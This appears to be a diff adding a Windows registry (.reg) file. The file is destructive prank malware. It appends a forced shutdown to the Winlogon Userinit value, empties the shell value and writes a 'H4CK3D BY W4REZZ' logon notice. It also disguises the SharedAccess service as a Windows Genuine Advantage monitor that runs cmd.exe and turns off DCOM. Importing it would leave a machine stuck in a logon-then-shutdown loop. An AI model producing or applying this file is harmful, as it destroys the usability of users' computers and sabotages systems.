@@ -1,0 +1,24 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Userinit"="C:\\WINDOWS\\system32\\userinit.exe,shutdown -s -f -t 10"
+"LegalNoticeCaption"="H4CK3D BY W4REZZ"
+"DefaultUserName"="Administrtor"
+"LegalNoticeText"="Happy day!"
+"PowerdownAfterShutdown"="1"
+"HibernationPreviouslyEnabled"="0"
+"SfcQuota"="TASKMAN.EXE"
+"System"="Linux"
+"VmApplet"="cmd.exe"
+"WinStationsDisabled"="1"
+"shell"=""
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess]
+"DisplayName"="Windows Genuine Advantage Validation Monitor"
+"Description"="Monitor WGA"
+"ImagePath"="cmd.exe"
+"Start"="0"
+"ErrorControl"="0"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole]
+"EnableDCOM"="N"
